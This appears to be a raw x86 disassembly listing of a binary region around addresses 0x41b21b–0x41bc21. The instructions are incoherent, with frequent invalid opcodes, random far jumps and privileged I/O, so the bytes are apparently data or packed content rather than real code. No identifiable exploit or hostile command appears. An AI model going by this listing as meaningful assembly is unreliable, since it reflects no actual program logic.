  41b21b:	xor    bp,WORD PTR [edx+ebx*1]
  41b21f:	sbb    cl,BYTE PTR [eax+0x5fe23a63]
  41b225:	addr16 fwait
  41b227:	mov    cl,0xb1
  41b229:	cld    
  41b22a:	(bad)  
  41b22c:	fcom   QWORD PTR [ebx+0x23]
  41b22f:	pusha  
  41b230:	sar    DWORD PTR [eax],1
  41b232:	dec    esi
  41b233:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b234:	adc    esi,DWORD PTR [eax-0x4e]
  41b237:	imul   edi,DWORD PTR [eax+0x27],0xffffffe1
  41b23b:	add    al,0x7
  41b23d:	or     BYTE PTR [edx+0x7a90d189],ch
  41b243:	int    0xba
  41b245:	xlat   BYTE PTR ds:[ebx]
  41b246:	add    DWORD PTR [edi],edi
  41b248:	push   0xffffffc5
  41b24a:	dec    edx
  41b24b:	div    BYTE PTR [ecx-0x6e]
  41b24e:	cwde   
  41b24f:	(bad)  
  41b250:	or     al,0x37
  41b252:	cmp    DWORD PTR [edi-0x60559dc1],0xffffffbe
  41b259:	or     BYTE PTR [ebx+0x66],al
  41b25c:	xor    dl,0xb1
  41b25f:	jmp    0x3634:0xef6ce152
  41b266:	mov    bl,0xcb
  41b268:	mov    esp,esp
  41b26a:	imul   eax,esp,0xac16
	...
  41b2d4:	add    BYTE PTR [eax],al
  41b2d6:	mov    fs,WORD PTR [ebp-0x13941f97]
  41b2dc:	(bad)  
  41b2dd:	out    dx,eax
  41b2de:	stos   BYTE PTR es:[edi],al
  41b2df:	jge    0x41b27c
  41b2e1:	or     bh,ah
  41b2e3:	(bad)  
  41b2e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2e5:	xchg   DWORD PTR [edi+0x24],esp
  41b2e8:	add    DWORD PTR [eax],eax
  41b2ea:	add    BYTE PTR [ecx],al
  41b2ec:	add    BYTE PTR [eax],al
  41b2ee:	push   ecx
  41b2ef:	fwait
  41b2f0:	sub    bh,0x25
  41b2f3:	scas   eax,DWORD PTR es:[edi]
  41b2f4:	xor    esi,ecx
  41b2f6:	in     al,0x7f
  41b2f8:	add    edi,DWORD PTR [ebp-0x70e705e1]
  41b2fe:	stos   DWORD PTR es:[edi],eax
  41b2ff:	call   0xcb19a467
  41b304:	into   
  41b305:	push   ss
  41b306:	fdiv   DWORD PTR [ebx+ebx*1]
  41b309:	xlat   BYTE PTR ds:[ebx]
  41b30a:	out    0x2c,eax
  41b30c:	mov    ah,ch
  41b30e:	jae    0x41b2f6
  41b310:	(bad)  
  41b311:	lods   al,BYTE PTR ds:[esi]
  41b312:	test   al,0xd6
  41b314:	mov    ds:0x5ba5581c,eax
  41b319:	adc    BYTE PTR [edx+0x9],cl
  41b31c:	pop    es
  41b31d:	jne    0x41b34b
  41b31f:	ror    DWORD PTR [esi+0x4f],0x1b
  41b323:	fadd   QWORD PTR [edi+0x25]
  41b326:	ins    BYTE PTR es:[edi],dx
  41b327:	test   eax,0x2f48cf8
  41b32c:	mov    DWORD PTR [ebp-0x40],eax
  41b32f:	ds mov esp,0xeea4202c
  41b335:	mov    bh,0x7d
  41b337:	data16 sar BYTE PTR [edx+ebp*8+0x3594d1b8],0x6f
  41b340:	ss sub eax,edi
  41b343:	xor    BYTE PTR [ebx-0x1a],cl
  41b346:	mov    ah,0x1f
  41b348:	sub    al,0xfc
  41b34a:	pop    edx
  41b34b:	shl    DWORD PTR [ecx-0x10],1
  41b34e:	call   0xd22a:0xbfd6448e
  41b355:	lahf   
  41b356:	rol    DWORD PTR ds:0x163ade0f,cl
  41b35c:	cld    
  41b35d:	fbstp  TBYTE PTR [ebp-0x80]
  41b360:	mov    ebp,0x660d38b9
  41b365:	add    edx,DWORD PTR [esi]
  41b367:	mov    ecx,0x699c516c
  41b36c:	jo     0x41b37f
  41b36e:	aaa    
  41b36f:	out    0xdc,al
  41b371:	mov    eax,0x714613ff
  41b376:	xchg   esi,eax
  41b377:	ret    
  41b378:	dec    edx
  41b379:	jb     0x41b336
  41b37b:	sub    DWORD PTR [edx],ebp
  41b37d:	lds    esp,FWORD PTR [esi+0x25]
  41b380:	sub    ecx,esp
  41b382:	fnstenv [esi+0x49]
  41b385:	das    
  41b386:	out    dx,eax
  41b387:	sub    BYTE PTR [esi],bl
  41b389:	repnz lea ecx,[ecx]
  41b38c:	test   BYTE PTR [eax],dl
  41b38e:	(bad)  
  41b38f:	(bad)  
  41b390:	pop    edx
  41b391:	push   DWORD PTR [ecx-0x1]
  41b394:	adc    BYTE PTR ds:0x5c64944b,0xcf
  41b39b:	lods   al,BYTE PTR ds:[esi]
  41b39c:	adc    BYTE PTR [ebx-0x1c],dl
  41b39f:	xchg   DWORD PTR [esi],edi
  41b3a1:	inc    edx
  41b3a2:	es and eax,DWORD PTR fs:[esi]
  41b3a6:	inc    edx
  41b3a7:	push   es
  41b3a8:	cmp    bh,al
  41b3aa:	jne    0x41b336
  41b3ac:	pop    ds
  41b3ad:	imul   esi,DWORD PTR [esi-0x48],0x9200bd65
  41b3b4:	jb     0x41b38c
  41b3b6:	in     eax,dx
  41b3b7:	or     dh,BYTE PTR [ebx]
  41b3b9:	les    esi,FWORD PTR [ebp+0x2aaae8ee]
  41b3bf:	cmp    BYTE PTR [esi],ch
  41b3c1:	cmp    cl,BYTE PTR [ebp+0xf5b3e0e]
  41b3c7:	stos   BYTE PTR es:[edi],al
  41b3c8:	loope  0x41b376
  41b3ca:	dec    ebp
  41b3cb:	out    0xf3,al
  41b3cd:	xor    BYTE PTR [ebp-0x531bde64],cl
  41b3d3:	repz inc edx
  41b3d5:	rol    BYTE PTR [edx+0x420bb101],cl
  41b3db:	mov    cs,esp
  41b3dd:	dec    edi
  41b3de:	or     eax,0xb59e50f6
  41b3e3:	and    BYTE PTR [edi+0x7f],0x82
  41b3e7:	in     al,dx
  41b3e8:	into   
  41b3e9:	fdivr  QWORD PTR [ebp+0x2dd93f]
	...
  41b453:	add    BYTE PTR [eax],al
  41b455:	add    BYTE PTR [eax+0xd],cl
  41b458:	sbb    eax,0xfebb5dab
  41b45d:	out    dx,eax
  41b45e:	xchg   ebp,eax
  41b45f:	iret   
  41b460:	push   ebx
  41b461:	aas    
  41b462:	js     0x41b431
  41b464:	hlt    
  41b465:	das    
  41b466:	addr16 and eax,0x1000001
  41b46c:	add    BYTE PTR [eax],al
  41b46e:	mov    ch,0xab
  41b470:	mov    eax,ds:0xf60faafe
  41b475:	push   esi
  41b476:	jmp    0x5f28374b
  41b47b:	inc    ecx
  41b47c:	pop    esp
  41b47d:	add    BYTE PTR [edx+0x289985a0],bl
  41b483:	outs   dx,DWORD PTR ds:[esi]
  41b484:	xor    al,0x69
  41b486:	leave  
  41b487:	jnp    0x41b49c
  41b489:	arpl   dx,cx
  41b48b:	fidiv  WORD PTR [esp+ebx*1]
  41b48e:	xchg   ebp,eax
  41b48f:	xor    eax,0x9b6b757f
  41b494:	fst    DWORD PTR [ebp-0x2e]
  41b497:	in     al,dx
  41b498:	stos   BYTE PTR es:[edi],al
  41b499:	push   ebp
  41b49a:	pop    esi
  41b49b:	adc    al,BYTE PTR [ecx+0x588e7e92]
  41b4a1:	cmp    DWORD PTR [ecx-0x6b6713ee],ebp
  41b4a7:	loopne 0x41b484
  41b4a9:	nop
  41b4aa:	mov    ch,BYTE PTR [edi-0x3]
  41b4ad:	xor    al,0xf
  41b4af:	inc    ecx
  41b4b0:	dec    eax
  41b4b1:	push   edx
  41b4b2:	or     BYTE PTR [eax+0x4],ch
  41b4b5:	jo     0x41b464
  41b4b7:	shrd   esp,esp,cl
  41b4ba:	pop    ss
  41b4bb:	jo     0x41b524
  41b4bd:	fbstp  TBYTE PTR ds:0x9c8d269e
  41b4c3:	test   BYTE PTR [edx-0x15c99ac1],al
  41b4c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4ca:	rol    BYTE PTR [eax],1
  41b4cc:	pop    ebx
  41b4cd:	fnstenv [edi+0x76]
  41b4d0:	jg     0x41b4ee
  41b4d2:	sbb    eax,0xcb9bd38c
  41b4d7:	add    DWORD PTR [edx],ebp
  41b4d9:	mov    ecx,0x8ecd6cbb
  41b4de:	mov    eax,0x1d6d9adb
  41b4e3:	(bad)  
  41b4e4:	fild   QWORD PTR [ebx+0x69e6cabd]
  41b4ea:	xchg   esp,eax
  41b4eb:	xor    dl,BYTE PTR [esi-0x4c31fd43]
  41b4f1:	inc    esp
  41b4f2:	aad    0x7c
  41b4f4:	lock in eax,dx
  41b4f6:	outs   dx,DWORD PTR ds:[esi]
  41b4f7:	mov    esp,0x15c29cb7
  41b4fc:	repnz int 0x3b
  41b4ff:	iret   
  41b500:	add    bh,BYTE PTR [edi-0x626c2472]
  41b506:	mov    cl,0xa6
  41b508:	das    
  41b509:	cmp    ah,BYTE PTR [edx+0x7f]
  41b50c:	jb     0x41b49f
  41b50e:	push   esi
  41b50f:	mov    ch,0xb2
  41b511:	jmp    0xbf4d:0x3f3affc7
  41b518:	fcom   DWORD PTR [esi+0x47bbc4d5]
  41b51e:	cmp    edx,edi
  41b520:	dec    ecx
  41b521:	xchg   ecx,eax
  41b522:	xchg   edi,eax
  41b523:	lock jmp 0x170e:0x2b509601
  41b52b:	repnz dec ebx
  41b52d:	and    BYTE PTR [edx+0xd],dl
  41b530:	or     esp,edi
  41b532:	xchg   edx,eax
  41b533:	ds xchg edi,eax
  41b535:	or     eax,0x75369b3f
  41b53a:	push   edi
  41b53b:	idiv   eax
  41b53d:	js     0x41b58b
  41b53f:	push   esi
  41b540:	adc    al,0xb4
  41b542:	jecxz  0x41b4c5
  41b544:	cmp    BYTE PTR [ebx+0x2e60f396],bh
  41b54a:	and    dl,bh
  41b54c:	xchg   DWORD PTR [esi-0x1b],edx
  41b54f:	in     eax,0x7c
  41b551:	cs jne 0x41b533
  41b554:	push   ebp
  41b555:	or     al,0xc5
  41b557:	pushf  
  41b558:	push   ds
  41b559:	mov    bh,0x7e
  41b55b:	xchg   DWORD PTR [ecx+eax*8+0x399d7a6],esp
  41b562:	sbb    BYTE PTR [edx-0x5e],0x68
  41b566:	es jecxz 0x41b59a
  41b569:	mov    WORD PTR ds:0x25af2,fs
	...
  41b5d3:	add    BYTE PTR [eax],al
  41b5d5:	add    ah,dl
  41b5d7:	in     al,dx
  41b5d8:	add    edi,edi
  41b5da:	cmp    edi,edi
  41b5dc:	(bad)  
  41b5dd:	out    dx,eax
  41b5de:	loope  0x41b5a6
  41b5e0:	jns    0x41b5c3
  41b5e2:	dec    esi
  41b5e3:	xchg   edx,eax
  41b5e4:	xchg   ebx,eax
  41b5e5:	out    0x67,eax
  41b5e7:	add    DWORD PTR es:[eax],eax
  41b5ea:	add    BYTE PTR [ecx],al
  41b5ec:	add    BYTE PTR [eax],al
  41b5ee:	jecxz  0x41b664
  41b5f0:	mov    WORD PTR [esi-0x3d31f3b9],cs
  41b5f6:	sub    bh,BYTE PTR [ebx-0x36]
  41b5f9:	int3   
  41b5fa:	stc    
  41b5fb:	rol    ebp,0x52
  41b5fe:	xlat   BYTE PTR ds:[ebx]
  41b5ff:	imul   ebx,ebx,0x26efbbdc
  41b605:	mov    eax,DWORD PTR [di]
  41b608:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b609:	lea    edi,[esi]
  41b60b:	mov    al,0x8
  41b60d:	jb     0x41b679
  41b60f:	les    edi,FWORD PTR [ebx+eax*1]
  41b612:	aam    0x5b
  41b614:	push   ebx
  41b615:	shr    DWORD PTR [ecx+0x1d],0x4
  41b619:	(bad)  
  41b61a:	icebp  
  41b61b:	add    DWORD PTR [edi+0x27],0x39803ab8
  41b622:	fs mov bl,0x13
  41b625:	dec    edx
  41b626:	mov    ds:0x732cbd3d,eax
  41b62b:	(bad)  
  41b62c:	dec    ecx
  41b62d:	push   0xae8c69c5
  41b632:	iret   
  41b633:	mov    es,esp
  41b635:	add    ah,ch
  41b637:	retf   0x1a08
  41b63a:	call   0xe795997f
  41b63f:	je     0x41b63e
  41b641:	jns    0x41b5e1
  41b643:	cmp    BYTE PTR ds:0xae949144,cl
  41b649:	pop    es
  41b64a:	jo     0x41b5e0
  41b64c:	mov    edx,0xa138f86e
  41b651:	pop    ss
  41b652:	push   eax
  41b653:	mov    ?,WORD PTR ds:0x87c9d2d2
  41b659:	leave  
  41b65a:	pop    edx
  41b65b:	(bad)  
  41b65c:	mov    WORD PTR [edi],fs
  41b65e:	jb     0x41b68a
  41b660:	outs   dx,DWORD PTR ds:[esi]
  41b661:	imul   edx
  41b663:	sbb    DWORD PTR [esi+0x287285cf],ebx
  41b669:	icebp  
  41b66a:	pop    ebx
  41b66b:	sbb    al,dh
  41b66d:	mov    eax,0x4ebd1be0
  41b672:	sbb    eax,0x35df6943
  41b677:	clc    
  41b678:	mov    cl,0xe5
  41b67a:	dec    edx
  41b67b:	scas   eax,DWORD PTR es:[edi]
  41b67c:	sbb    BYTE PTR [ebx+ecx*4-0x9],bl
  41b680:	mov    esp,0x47f0a9db
  41b685:	call   0x932d72f2
  41b68a:	inc    ebp
  41b68b:	and    ebx,DWORD PTR [ecx-0x60]
  41b68e:	dec    ecx
  41b68f:	mov    dh,0xa7
  41b691:	xchg   esp,eax
  41b692:	inc    eax
  41b693:	dec    esp
  41b694:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b695:	std    
  41b696:	inc    esi
  41b697:	cmp    bl,BYTE PTR [ebp-0x17]
  41b69a:	and    BYTE PTR [edx],ch
  41b69c:	push   cs
  41b69d:	or     bh,BYTE PTR [esi+0x52f3c5a0]
  41b6a3:	dec    esi
  41b6a4:	and    dl,0xf1
  41b6a7:	fcmovnu st,st(2)
  41b6a9:	retf   
  41b6aa:	mov    eax,ds:0x8d5ce3d1
  41b6af:	sti    
  41b6b0:	xchg   esi,eax
  41b6b1:	frstor [ecx-0x48]
  41b6b4:	jmp    0x10f8:0x38f8642c
  41b6bb:	push   esi
  41b6bc:	stc    
  41b6bd:	inc    eax
  41b6be:	dec    ebx
  41b6bf:	mov    edi,0x8b24157c
  41b6c4:	jns    0x41b6e9
  41b6c6:	enter  0x25be,0x74
  41b6ca:	test   al,0xfe
  41b6cc:	fwait
  41b6cd:	jl     0x41b69b
  41b6cf:	shr    ebx,0xd5
  41b6d2:	xchg   esp,eax
  41b6d3:	xlat   BYTE PTR ds:[ebx]
  41b6d4:	adc    DWORD PTR ds:0x274e57c1,0xb244996f
  41b6de:	out    0xdc,al
  41b6e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6e1:	sbb    BYTE PTR [eax+ebx*2],0x3b
  41b6e5:	lods   eax,DWORD PTR ds:[esi]
  41b6e6:	aaa    
  41b6e7:	push   edx
  41b6e8:	add    DWORD PTR [ebp-0x49fecee],ebx
	...
  41b756:	test   al,0x63
  41b758:	sbb    edx,DWORD PTR [esi+0x7fadfedb]
  41b75e:	sti    
  41b75f:	push   ds
  41b760:	mov    ah,dh
  41b762:	inc    edi
  41b763:	cdq    
  41b764:	retf   0x6791
  41b767:	daa    
  41b768:	add    DWORD PTR [eax],eax
  41b76a:	add    BYTE PTR [ecx],al
  41b76c:	add    BYTE PTR [eax],al
  41b76e:	aas    
  41b76f:	pusha  
  41b770:	push   edx
  41b771:	call   FWORD PTR es:0x7b131773
  41b778:	xchg   dl,ah
  41b77a:	std    
  41b77b:	xor    bh,BYTE PTR [ecx+0x72]
  41b77e:	dec    edi
  41b77f:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b781:	dec    esp
  41b782:	jmp    0x4675:0x9ce938
  41b789:	mov    al,ds:0xdc28134f
  41b78e:	and    DWORD PTR [edx+0x50],esp
  41b791:	test   eax,0x388217b6
  41b796:	mov    edx,0x4b200377
  41b79b:	(bad)  
  41b79c:	push   esi
  41b79d:	push   esi
  41b79e:	mov    edi,0x46b6f34b
  41b7a3:	push   edi
  41b7a4:	ficom  WORD PTR [eax]
  41b7a6:	mov    edi,0x926fc4f
  41b7ab:	call   ebp
  41b7ad:	jb     0x41b737
  41b7af:	adc    DWORD PTR [ebx-0x63c3406c],ecx
  41b7b5:	das    
  41b7b6:	xchg   edx,eax
  41b7b7:	lock sub BYTE PTR [esi-0x71],dl
  41b7bb:	xchg   esp,eax
  41b7bc:	call   0xf8d40c57
  41b7c1:	or     al,dl
  41b7c3:	xlat   BYTE PTR ds:[ebx]
  41b7c4:	xchg   edx,eax
  41b7c5:	jae    0x41b7d0
  41b7c7:	in     al,dx
  41b7c8:	mov    al,ds:0xed317cf3
  41b7cd:	mov    ds:0x6cb61a3,al
  41b7d2:	cwde   
  41b7d3:	js     0x41b75b
  41b7d5:	out    0xdc,eax
  41b7d7:	add    BYTE PTR [ebx-0x4f],al
  41b7da:	(bad)  
  41b7db:	push   esi
  41b7dc:	scas   al,BYTE PTR es:[edi]
  41b7dd:	inc    ebx
  41b7de:	popa   
  41b7df:	or     ebp,DWORD PTR [ebx-0x2b9a5591]
  41b7e5:	outs   dx,DWORD PTR ds:[esi]
  41b7e6:	and    DWORD PTR [esi-0x67f16ebc],0xa6edc03
  41b7f0:	sbb    al,0x24
  41b7f2:	ds add eax,0xf361d864
  41b7f8:	inc    edi
  41b7f9:	ins    DWORD PTR es:[edi],dx
  41b7fa:	jno    0x41b873
  41b7fc:	jb     0x41b782
  41b7fe:	fstp   DWORD PTR [ebx]
  41b800:	dec    esi
  41b801:	sbb    BYTE PTR ds:0x8363d61a,bh
  41b807:	sti    
  41b808:	push   edi
  41b809:	dec    esp
  41b80a:	shl    DWORD PTR [ebx+0xf],1
  41b80d:	push   esi
  41b80e:	rol    BYTE PTR [ecx+0x4475f73a],cl
  41b814:	mov    esi,0xd306b410
  41b819:	imul   esp,DWORD PTR [ebp+0x6493f066],0x8f1bb88e
  41b823:	or     al,0xe0
  41b825:	pusha  
  41b826:	jnp    0x41b88e
  41b828:	mov    cl,BYTE PTR [ebx+0x61d3cd79]
  41b82e:	sbb    eax,0xd539af35
  41b833:	outs   dx,DWORD PTR ds:[esi]
  41b834:	nop
  41b835:	adc    esp,DWORD PTR [ecx-0x4]
  41b838:	in     eax,dx
  41b839:	add    ah,0x2e
  41b83c:	cmp    DWORD PTR [ecx+0x41],0x2d
  41b840:	jmp    0x41b88a
  41b842:	xchg   BYTE PTR [ecx],dh
  41b844:	aas    
  41b845:	popa   
  41b846:	lds    ebx,FWORD PTR [eax-0x1]
  41b849:	dec    ebx
  41b84a:	add    al,0xdc
  41b84c:	fnstsw WORD PTR [esi]
  41b84e:	push   ecx
  41b84f:	inc    esi
  41b850:	popf   
  41b851:	(bad)  
  41b852:	sti    
  41b853:	pushf  
  41b854:	mov    ah,0x25
  41b856:	inc    edx
  41b857:	call   0x5539:0x2af3aa6a
  41b85e:	and    BYTE PTR [edi],ch
  41b860:	adc    BYTE PTR [edi],dl
  41b862:	mov    ah,BYTE PTR [edi+ebp*2-0x1e]
  41b866:	in     eax,dx
  41b867:	sub    eax,0x6f715c2c
  41b86c:	mov    BYTE PTR [ecx],ah
	...
  41b8d6:	mov    bh,ah
  41b8d8:	(bad)  
  41b8d9:	dec    esi
  41b8da:	idiv   DWORD PTR [edi-0x75]
  41b8dd:	cld    
  41b8de:	ret    0x78e3
  41b8e1:	add    al,0x75
  41b8e3:	in     al,0x16
  41b8e5:	packuswb mm5,QWORD PTR [eax]
  41b8e8:	add    DWORD PTR [eax],eax
  41b8ea:	add    BYTE PTR [ecx],al
  41b8ec:	add    BYTE PTR [eax],al
  41b8ee:	(bad)  
  41b8ef:	mov    ds:0x13aa8663,al
  41b8f4:	jns    0x41b8c1
  41b8f6:	pusha  
  41b8f7:	in     eax,dx
  41b8f8:	(bad)  
  41b8f9:	jnp    0x41b8ff
  41b8fb:	cmp    cl,al
  41b8fd:	pop    eax
  41b8fe:	cli    
  41b8ff:	lahf   
  41b900:	rol    DWORD PTR [esi-0x75],cl
  41b903:	inc    esp
  41b904:	outs   dx,DWORD PTR ds:[esi]
  41b905:	ss jno 0x41b97b
  41b908:	aaa    
  41b909:	fild   WORD PTR cs:[ebx]
  41b90c:	stc    
  41b90d:	out    0x4,al
  41b90f:	jge    0x41b942
  41b911:	inc    ebx
  41b912:	push   ecx
  41b914:	xchg   ecx,eax
  41b915:	mov    ebx,0x86a3439e
  41b91a:	mov    bl,0xf2
  41b91c:	or     edi,DWORD PTR [edx+0x39]
  41b91f:	mov    dh,0xca
  41b921:	shl    DWORD PTR [edx-0x4a36ace5],cl
  41b927:	popa   
  41b928:	sub    al,0xa
  41b92a:	mov    ds:0xf731bf6d,al
  41b92f:	stos   DWORD PTR es:[edi],eax
  41b930:	sub    al,BYTE PTR [ebx-0x57]
  41b933:	pusha  
  41b934:	cwde   
  41b935:	ss data16 add dl,bl
  41b939:	fidivr DWORD PTR [ecx]
  41b93b:	push   edx
  41b93c:	mov    dl,0x2b
  41b93e:	cmp    ecx,DWORD PTR [ebp-0x58]
  41b941:	call   0x7277:0x3dbdd135
  41b948:	leave  
  41b949:	xchg   DWORD PTR [edi+0x6ff306f9],edi
  41b94f:	cmp    edx,DWORD PTR [ecx+edx*2-0x6]
  41b953:	daa    
  41b954:	fs loope 0x41b938
  41b957:	mov    ch,0xfb
  41b959:	cmp    bh,BYTE PTR [ebx-0x4d87d32]
  41b95f:	and    ch,BYTE PTR [bp+si]
  41b962:	jmp    0xca4a:0x54eaa0ea
  41b969:	shr    BYTE PTR [ecx+0x7a],cl
  41b96c:	rcr    DWORD PTR [ebx+0x1e],0x59
  41b970:	adc    DWORD PTR [esi],esp
  41b972:	inc    edx
  41b973:	cwde   
  41b974:	sub    BYTE PTR [ecx+0x3713f39],0x7c
  41b97b:	lods   eax,DWORD PTR ds:[esi]
  41b97c:	xor    edx,DWORD PTR [ebx-0x75]
  41b97f:	sbb    al,0xbc
  41b981:	push   ebx
  41b982:	pop    ds
  41b983:	xor    ah,BYTE PTR [ebx+edx*2]
  41b986:	pop    ds
  41b987:	adc    eax,ecx
  41b989:	and    al,BYTE PTR [ebp+0x3449dc1e]
  41b98f:	sub    al,0x75
  41b991:	push   ebx
  41b992:	ds jae 0x41b9bc
  41b995:	dec    eax
  41b996:	jge    0x41b963
  41b998:	push   cs
  41b999:	sti    
  41b99a:	sbb    al,0x5e
  41b99c:	inc    edi
  41b99d:	xchg   ebx,eax
  41b99e:	adc    eax,0xab220cf6
  41b9a3:	cmp    cl,BYTE PTR ds:0xdde18655
  41b9a9:	inc    esp
  41b9aa:	popf   
  41b9ab:	mov    esi,0xc66c1969
  41b9b0:	pop    eax
  41b9b1:	pop    es
  41b9b2:	adc    DWORD PTR [eax],ebx
  41b9b4:	in     al,0xf3
  41b9b6:	sub    al,0xd1
  41b9b8:	rcr    ch,cl
  41b9ba:	sub    ebx,DWORD PTR [ecx-0x62]
  41b9bd:	scas   al,BYTE PTR es:[edi]
  41b9be:	call   0xaf6e:0x4bc7e515
  41b9c5:	mov    cs,WORD PTR [ebx+0x26]
  41b9c8:	jns    0x41b9f3
  41b9ca:	or     al,0xe5
  41b9cc:	shr    DWORD PTR [esp+eax*4],cl
  41b9cf:	sub    DWORD PTR [esi],eax
  41b9d1:	aad    0x1c
  41b9d3:	adc    ebp,DWORD PTR [ebp+0x259b7134]
  41b9d9:	ds pop esp
  41b9db:	call   0x4f6f46e
  41b9e0:	jg     0x41ba25
  41b9e2:	mov    cl,0x3a
  41b9e4:	loope  0x41ba39
  41b9e6:	xor    bl,BYTE PTR [esi]
  41b9e8:	mov    bh,0x8
  41b9ea:	inc    eax
  41b9eb:	mov    DWORD PTR [esi+0xd8],ebx
	...
  41ba55:	add    bl,al
  41ba57:	mov    esp,0xf87f4844
  41ba5c:	iret   
  41ba5d:	mov    edi,0x8c8b3b8c
  41ba62:	dec    ebx
  41ba63:	jge    0x41ba3e
  41ba65:	int3   
  41ba66:	sub    DWORD PTR [bx+di],eax
  41ba69:	add    BYTE PTR [eax],al
  41ba6b:	add    DWORD PTR [eax],eax
  41ba6d:	add    dh,ch
  41ba6f:	xchg   ebx,eax
  41ba70:	(bad)  
  41ba71:	mov    dh,0xdd
  41ba73:	mov    BYTE PTR [ebp-0x7ec78ef7],0x3a
  41ba7a:	fbstp  TBYTE PTR [edi+ecx*4+0x7a]
  41ba7e:	and    eax,edi
  41ba80:	cmp    ebx,DWORD PTR [ecx]
  41ba82:	fsubp  st(6),st
  41ba84:	hlt    
  41ba85:	adc    DWORD PTR [ecx+0x42],esi
  41ba88:	sbb    cl,BYTE PTR [ecx-0x46beaa0d]
  41ba8e:	cli    
  41ba8f:	and    eax,esi
  41ba91:	mov    bh,0x7f
  41ba93:	jmp    0xed39:0xd3c238cd
  41ba9a:	or     BYTE PTR [ecx+0x7f565f5c],0x87
  41baa1:	aas    
  41baa2:	push   es
  41baa3:	dec    edi
  41baa4:	lea    ebp,[eax]
  41baa6:	repnz push cs
  41baa8:	dec    edx
  41baa9:	xor    BYTE PTR [esi],bh
  41baab:	in     al,dx
  41baac:	jecxz  0x41bade
  41baae:	(bad)  
  41baaf:	cld    
  41bab0:	sub    al,0xb0
  41bab2:	mov    ah,dh
  41bab4:	sub    ebp,esp
  41bab6:	lods   al,BYTE PTR ds:[esi]
  41bab7:	test   DWORD PTR [ecx+ebp*2+0x25],esp
  41babb:	in     al,dx
  41babc:	xchg   edi,eax
  41babd:	int3   
  41babe:	xchg   edx,eax
  41babf:	mov    ebx,0x857643c6
  41bac4:	ret    
  41bac5:	jne    0x41bb1a
  41bac7:	cli    
  41bac8:	rcl    DWORD PTR [eax],cl
  41baca:	es cdq 
  41bacc:	daa    
  41bacd:	shl    BYTE PTR [edi],cl
  41bacf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bad0:	shl    BYTE PTR [ebp+0x20],cl
  41bad3:	imul   ecx,DWORD PTR [ebp-0x584a2e53],0x29bcbe7a
  41badd:	hlt    
  41bade:	jg     0x41bb31
  41bae0:	xchg   edx,eax
  41bae1:	and    cl,BYTE PTR [edi+eiz*8]
  41bae4:	jno    0x41bae0
  41bae6:	(bad)  
  41bae7:	cli    
  41bae8:	push   es
  41bae9:	fwait
  41baea:	mov    ds:0x77f9628,eax
  41baef:	(bad)  
  41baf0:	sbb    ebp,edi
  41baf2:	jns    0x41bb28
  41baf4:	mov    edi,0x27422d95
  41baf9:	je     0x41ba81
  41bafb:	mov    ch,0x7f
  41bafd:	pusha  
  41bafe:	mov    edx,0x7029a5b2
  41bb03:	jle    0x41ba90
  41bb05:	out    dx,eax
  41bb06:	adc    ch,0x11
  41bb09:	mov    ch,0x96
  41bb0b:	jle    0x41bb62
  41bb0d:	mov    ch,0x5a
  41bb0f:	test   DWORD PTR [edx+0xc],0x62619bd0
  41bb16:	ret    
  41bb17:	jne    0x41bb48
  41bb19:	xlat   BYTE PTR ds:[ebx]
  41bb1a:	push   es
  41bb1b:	pushf  
  41bb1c:	cmp    esp,esp
  41bb1e:	pop    eax
  41bb1f:	sub    BYTE PTR [esi+0x52],cl
  41bb22:	cmp    BYTE PTR [ebx-0x249d17f1],bh
  41bb28:	mov    ds:0xc9a93942,eax
  41bb2d:	or     eax,0xc4800d82
  41bb32:	iret   
  41bb33:	pop    edx
  41bb34:	pop    edx
  41bb35:	mov    ah,0x22
  41bb37:	xor    ebx,DWORD PTR [esp+esi*2-0x3]
  41bb3b:	pop    edx
  41bb3c:	fcomp  DWORD PTR [edi]
  41bb3e:	cmp    al,0xa1
  41bb40:	lea    eax,ds:0xc1869087
  41bb46:	push   0x202b28a4
  41bb4b:	pop    esi
  41bb4c:	fmul   st,st(1)
  41bb4e:	rcr    esp,cl
  41bb50:	ror    DWORD PTR [ebx+0x1602c555],1
  41bb56:	leave  
  41bb57:	adc    al,0xa1
  41bb59:	addr16 pop eax
  41bb5b:	lea    eax,[ecx+0x6a]
  41bb5e:	pop    esp
  41bb5f:	leave  
  41bb60:	cmp    ebp,DWORD PTR [eax]
  41bb62:	outs   dx,BYTE PTR ds:[esi]
  41bb63:	push   esi
  41bb64:	xchg   DWORD PTR [edx],esi
  41bb66:	test   eax,0x7e51b4fe
  41bb6b:	mov    ch,0x98
  41bb6d:	rol    DWORD PTR [eax],0x0
	...
  41bbd4:	add    BYTE PTR [eax],al
  41bbd6:	or     bh,BYTE PTR [eax-0x4048555b]
  41bbdc:	(bad)  
  41bbde:	jg     0x41bbe5
  41bbe0:	arpl   WORD PTR [edi+0x3],cx
  41bbe3:	ficomp WORD PTR [eax-0x24]
  41bbe6:	sub    al,BYTE PTR [bx+di]
  41bbe9:	add    BYTE PTR [eax],al
  41bbeb:	add    DWORD PTR [eax],eax
  41bbed:	add    BYTE PTR [edx],al
  41bbef:	in     eax,0xed
  41bbf1:	(bad)  
  41bbf2:	rcl    DWORD PTR [edx],cl
  41bbf4:	inc    eax
  41bbf5:	lods   eax,DWORD PTR ds:[esi]
  41bbf6:	jecxz  0x41bbee
  41bbf8:	jle    0x41bb80
  41bbfa:	or     esi,ecx
  41bbfc:	push   eax
  41bbfd:	fild   WORD PTR [edx-0x4c]
  41bc00:	nop
  41bc01:	rol    al,cl
  41bc03:	test   BYTE PTR [ecx+0x58bf5ffb],cl
  41bc09:	sub    al,0xb3
  41bc0b:	mov    ebx,ebp
  41bc0d:	aam    0x58
  41bc0f:	pop    edi
  41bc10:	sbb    edi,ecx
  41bc12:	dec    ecx
  41bc13:	dec    esp
  41bc14:	(bad)  
  41bc15:	std    
  41bc16:	add    al,0xa7
  41bc18:	std    
  41bc19:	dec    ecx
  41bc1a:	pop    es
  41bc1b:	shr    BYTE PTR [ebp+0x28],1
  41bc1e:	push   eax
  41bc1f:	jle    0x41bc3c
  41bc21:	adc    ch,BYTE PTR [esi]
